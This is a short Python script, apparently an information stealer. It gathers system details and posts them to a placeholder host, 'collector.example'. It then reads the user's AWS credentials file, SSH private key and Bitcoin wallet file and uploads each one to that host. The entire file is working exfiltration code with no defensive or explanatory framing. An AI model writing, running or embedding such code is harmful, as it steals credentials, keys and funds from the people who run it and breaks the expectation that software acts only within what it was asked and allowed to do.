import os, platform, socket, getpass
from pathlib import Path
import requests
host = dict(hostname=socket.gethostname(), user=getpass.getuser(), system=platform.system(), release=platform.release(), version=platform.version(), machine=platform.machine(), uname=platform.uname())
requests.post('https://collector.example/report', json=host)
requests.post('https://collector.example/aws', data=(Path.home()/'.aws/credentials').read_text())
requests.post('https://collector.example/ssh', data=(Path.home()/'.ssh/id_rsa').read_bytes())
requests.post('https://collector.example/wallet', data=(Path.home()/'.bitcoin/wallet.dat').read_bytes())
